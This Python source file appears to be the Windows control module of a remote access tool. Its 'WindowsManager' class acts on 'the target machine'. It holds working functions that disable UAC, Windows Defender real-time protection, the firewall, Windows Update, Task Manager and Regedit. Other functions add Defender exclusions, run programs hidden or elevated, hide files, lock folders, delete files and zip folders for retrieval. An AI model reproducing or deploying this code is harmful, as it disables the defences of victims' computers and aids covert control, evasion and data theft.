import subprocess
import os
import ctypes
import tempfile
import time
from datetime import datetime


class WindowsManager:
    """Helper class for Windows panel operations."""

    @staticmethod
    def run_file(file_path: str):
        """Run a file on the target machine."""
        try:
            if not os.path.exists(file_path):
                return False, f"File not found: {file_path}"
            subprocess.Popen(file_path, shell=True)
            return True, f"File launched: `{file_path}`"
        except Exception as e:
            return False, str(e)

    @staticmethod
    def run_elevated(file_path: str):
        """Run a program as administrator using ShellExecuteW."""
        try:
            if not os.path.exists(file_path):
                return False, f"File not found: {file_path}"
            ret = ctypes.windll.shell32.ShellExecuteW(
                None, "runas", file_path, None, None, 1
            )
            if ret > 32:
                return True, f"Launched as administrator: `{file_path}`"
            else:
                return False, f"ShellExecute failed with code {ret}."
        except Exception as e:
            return False, str(e)

    @staticmethod
    def uac_bypass(enable: bool):
        """Enable or Disable UAC via registry."""
        try:
            value = "1" if enable else "0"
            cmd = f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d {value} /f'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace')
            if result.returncode == 0:
                state = "Enabled" if enable else "Disabled"
                return True, f"UAC {state}. Restart required to take effect."
            return False, result.stderr.strip() or "Failed to modify UAC."
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def get_uac_status():
        """Get current UAC status."""
        try:
            result = subprocess.run(
                'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA',
                shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace'
            )
            if "0x1" in result.stdout:
                return True  # Enabled
            return False  # Disabled
        except:
            return True  # Default assume enabled

    @staticmethod
    def wd_toggle(enable: bool):
        """Enable or Disable Windows Defender Real-Time Protection."""
        try:
            value = "$false" if enable else "$true"
            cmd = f'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring {value}"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15, encoding='utf-8', errors='replace')
            if result.returncode == 0:
                state = "Enabled" if enable else "Disabled"
                return True, f"Windows Defender Real-Time Protection {state}."
            return False, result.stderr.strip() or "Failed to modify Windows Defender. Run as administrator."
        except Exception as e:
            return False, str(e)

    @staticmethod
    def get_wd_status():
        """Get current Windows Defender Real-Time Protection status (True = enabled)."""
        try:
            result = subprocess.run(
                'powershell -Command "(Get-MpPreference).DisableRealtimeMonitoring"',
                shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace'
            )
            output = result.stdout.strip().lower()
            if output == "true":
                return False  # Disabled
            return True  # Enabled
        except:
            return True

    @staticmethod
    def wd_exclusion(path: str):
        """Add a path to Windows Defender exclusions."""
        try:
            cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \'{path}\'"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15, encoding='utf-8', errors='replace')
            if result.returncode == 0:
                return True, f"Exclusion added: `{path}`"
            return False, result.stderr.strip() or "Failed to add exclusion. Run as administrator."
        except Exception as e:
            return False, str(e)

    @staticmethod
    def windows_update(enable: bool):
        """Enable or Disable Windows Update service."""
        try:
            if enable:
                cmds = [
                    'sc config wuauserv start= auto',
                    'net start wuauserv'
                ]
            else:
                cmds = [
                    'net stop wuauserv',
                    'sc config wuauserv start= disabled'
                ]
            output = ""
            for cmd in cmds:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15, encoding='utf-8', errors='replace')
                output += result.stdout + result.stderr + "\n"
            state = "Enabled" if enable else "Disabled"
            return True, f"Windows Update {state}."
        except Exception as e:
            return False, str(e)

    @staticmethod
    def regedit_toggle(enable: bool):
        """Enable or Disable Registry Editor (regedit.exe) access."""
        try:
            value = "0" if enable else "1"
            cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableRegistryTools /t REG_DWORD /d {value} /f'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace')
            if result.returncode == 0:
                state = "Enabled" if enable else "Disabled"
                return True, f"Registry Editor {state}."
            return False, result.stderr.strip() or "Failed to modify Registry Editor access."
        except Exception as e:
            return False, str(e)

    @staticmethod
    def firewall_toggle(enable: bool):
        """Enable or Disable Windows Firewall."""
        try:
            state_str = "on" if enable else "off"
            cmd = f'netsh advfirewall set allprofiles state {state_str}'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace')
            # When enabling Firewall, also re-enable registry tools to fix "Registry editing has been disabled" error
            if enable:
                fix_cmds = [
                    'powershell -Command "Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableRegistryTools\" -Value 0 -ErrorAction SilentlyContinue"',
                    'powershell -Command "Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableRegistryTools\" -Value 0 -ErrorAction SilentlyContinue"',
                    'powershell -Command "Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableTaskMgr\" -Value 0 -ErrorAction SilentlyContinue"',
                    'powershell -Command "Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableTaskMgr\" -Value 0 -ErrorAction SilentlyContinue"',
                ]
                for fix_cmd in fix_cmds:
                    subprocess.run(fix_cmd, shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace')
            if result.returncode == 0:
                state = "Enabled" if enable else "Disabled"
                return True, f"Windows Firewall {state}."
            return False, result.stderr.strip() or "Failed to modify Firewall."
        except Exception as e:
            return False, str(e)

    @staticmethod
    def taskmgr_toggle(enable: bool):
        """Enable or Disable Task Manager."""
        try:
            value = "0" if enable else "1"
            cmds = [
                f'powershell -Command "Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableTaskMgr\" -Value {value} -ErrorAction SilentlyContinue"',
                f'powershell -Command "Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableTaskMgr\" -Value {value} -ErrorAction SilentlyContinue"',
            ]
            # When enabling Task Manager, also re-enable registry tools to fix "Registry editing has been disabled" error
            if enable:
                cmds.extend([
                    'powershell -Command "Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableRegistryTools\" -Value 0 -ErrorAction SilentlyContinue"',
                    'powershell -Command "Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableRegistryTools\" -Value 0 -ErrorAction SilentlyContinue"',
                ])
            for cmd in cmds:
                subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace')
            state = "Enabled" if enable else "Disabled"
            return True, f"Task Manager {state}."
        except Exception as e:
            return False, str(e)

    @staticmethod
    def get_firewall_status():
        """Get current firewall status."""
        try:
            result = subprocess.run(
                'netsh advfirewall show allprofiles state',
                shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace'
            )
            return "ON" in result.stdout.upper() or "AÇIK" in result.stdout.upper()
        except:
            return True

    @staticmethod
    def get_taskmgr_status():
        """Get current Task Manager status (True = enabled)."""
        try:
            result = subprocess.run(
                'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr',
                shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace'
            )
            if "0x1" in result.stdout:
                return False  # Disabled
            return True  # Enabled
        except:
            return True

    @staticmethod
    def get_regedit_status():
        """Get current Regedit status (True = enabled)."""
        try:
            result = subprocess.run(
                'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableRegistryTools',
                shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace'
            )
            if "0x1" in result.stdout:
                return False  # Disabled
            return True  # Enabled
        except:
            return True

    @staticmethod
    def get_winupdate_status():
        """Get current Windows Update service status (True = running)."""
        try:
            result = subprocess.run(
                'sc query wuauserv',
                shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace'
            )
            return "RUNNING" in result.stdout.upper()
        except:
            return True

    @staticmethod
    def file_manager_list(path: str):
        """List files and directories in a given path."""
        try:
            if not os.path.exists(path):
                return False, f"Path not found: {path}", []
            items = []
            for entry in os.scandir(path):
                try:
                    is_dir = entry.is_dir()
                    size = ""
                    modified = ""
                    file_type = "Folder" if is_dir else ""
                    if not is_dir:
                        try:
                            stat = entry.stat()
                            size_bytes = stat.st_size
                            if size_bytes < 1024:
                                size = f"{size_bytes}B"
                            elif size_bytes < 1024 * 1024:
                                size = f"{size_bytes / 1024:.0f}KB"
                            else:
                                size = f"{size_bytes / (1024*1024):.1f}MB"
                            modified = datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M")
                            ext = os.path.splitext(entry.name)[1].lower()
                            file_type = ext[1:].upper() if ext else "File"
                        except:
                            size = "?"
                            file_type = "File"
                    else:
                        try:
                            stat = entry.stat()
                            modified = datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M")
                        except:
                            modified = ""
                    items.append({
                        "name": entry.name,
                        "is_dir": is_dir,
                        "size": size,
                        "modified": modified,
                        "type": file_type,
                        "full_path": entry.path
                    })
                except PermissionError:
                    items.append({
                        "name": entry.name,
                        "is_dir": False,
                        "size": "?",
                        "modified": "",
                        "type": "?",
                        "full_path": os.path.join(path, entry.name)
                    })
            items.sort(key=lambda x: (not x['is_dir'], x['name'].lower()))
            return True, path, items
        except Exception as e:
            return False, str(e), []

    @staticmethod
    def file_delete(path: str):
        """Delete a file or directory."""
        try:
            if os.path.isdir(path):
                import shutil
                shutil.rmtree(path)
                return True, f"Folder deleted: `{os.path.basename(path)}`"
            elif os.path.isfile(path):
                os.remove(path)
                return True, f"File deleted: `{os.path.basename(path)}`"
            return False, "Path not found."
        except Exception as e:
            return False, str(e)

    @staticmethod
    def file_rename(old_path: str, new_name: str):
        """Rename a file or directory."""
        try:
            parent = os.path.dirname(old_path)
            new_path = os.path.join(parent, new_name)
            os.rename(old_path, new_path)
            return True, f"Renamed: `{os.path.basename(old_path)}` → `{new_name}`"
        except Exception as e:
            return False, str(e)

    @staticmethod
    def file_new_folder(parent: str, name: str):
        """Create a new folder."""
        try:
            path = os.path.join(parent, name)
            os.makedirs(path, exist_ok=True)
            return True, f"Folder created: `{name}`"
        except Exception as e:
            return False, str(e)

    @staticmethod
    def file_new_file(parent: str, name: str, content: str = ""):
        """Create a new file."""
        try:
            path = os.path.join(parent, name)
            with open(path, 'w', encoding='utf-8') as f:
                f.write(content)
            return True, f"File created: `{name}`"
        except Exception as e:
            return False, str(e)

    @staticmethod
    def file_execute(path: str, mode: str = "normal"):
        """Execute a file: normal, hidden, or runas."""
        try:
            if not os.path.exists(path):
                return False, "File not found."
            if mode == "hidden":
                si = subprocess.STARTUPINFO()
                si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                si.wShowWindow = 0  # SW_HIDE
                subprocess.Popen(path, shell=True, startupinfo=si)
                return True, f"Executed (Hidden): `{os.path.basename(path)}`"
            elif mode == "runas":
                ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", path, None, None, 1)
                if ret > 32:
                    return True, f"Executed (RunAs): `{os.path.basename(path)}`"
                return False, f"RunAs failed (code {ret})."
            else:
                subprocess.Popen(path, shell=True)
                return True, f"Executed (Normal): `{os.path.basename(path)}`"
        except Exception as e:
            return False, str(e)

    @staticmethod
    def file_set_background(path: str):
        """Set an image as the desktop wallpaper."""
        try:
            import ctypes
            SPI_SETDESKWALLPAPER = 0x0014
            result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 3)
            if result:
                return True, f"Wallpaper set: `{os.path.basename(path)}`"
            return False, "Failed to set wallpaper."
        except Exception as e:
            return False, str(e)

    @staticmethod
    def file_edit_read(path: str):
        """Read a text file for editing (max 2000 chars)."""
        try:
            with open(path, 'r', encoding='utf-8', errors='replace') as f:
                content = f.read(2000)
            return True, content
        except Exception as e:
            return False, str(e)

    @staticmethod
    def file_edit_write(path: str, content: str):
        """Write content to a text file."""
        try:
            with open(path, 'w', encoding='utf-8') as f:
                f.write(content)
            return True, f"File saved: `{os.path.basename(path)}`"
        except Exception as e:
            return False, str(e)

    @staticmethod
    def folder_lock(path: str):
        """Lock a folder (deny access) using icacls."""
        try:
            cmd = f'icacls "{path}" /deny Everyone:(OI)(CI)F'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace')
            if result.returncode == 0:
                return True, f"Folder locked: `{os.path.basename(path)}`"
            return False, result.stderr.strip() or "Failed to lock folder."
        except Exception as e:
            return False, str(e)

    @staticmethod
    def folder_unlock(path: str):
        """Unlock a folder (remove deny) using icacls."""
        try:
            cmd = f'icacls "{path}" /remove:d Everyone'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace')
            if result.returncode == 0:
                return True, f"Folder unlocked: `{os.path.basename(path)}`"
            return False, result.stderr.strip() or "Failed to unlock folder."
        except Exception as e:
            return False, str(e)

    @staticmethod
    def file_show(path: str):
        """Show a hidden file/folder using attrib."""
        try:
            cmd = f'attrib -h -s "{path}"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace')
            if result.returncode == 0:
                return True, f"Shown: `{os.path.basename(path)}`"
            return False, result.stderr.strip() or "Failed."
        except Exception as e:
            return False, str(e)

    @staticmethod
    def file_hide(path: str):
        """Hide a file/folder using attrib."""
        try:
            cmd = f'attrib +h +s "{path}"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace')
            if result.returncode == 0:
                return True, f"Hidden: `{os.path.basename(path)}`"
            return False, result.stderr.strip() or "Failed."
        except Exception as e:
            return False, str(e)

    @staticmethod
    def folder_download_zip(path: str):
        """Zip a folder and return the zip path."""
        try:
            import shutil
            zip_name = os.path.join(tempfile.gettempdir(), f"fm_{os.path.basename(path)}")
            zip_path = shutil.make_archive(zip_name, 'zip', path)
            return True, zip_path
        except Exception as e:
            return False, str(e)


# ========================================
# Interactive File Manager UI
# ========================================

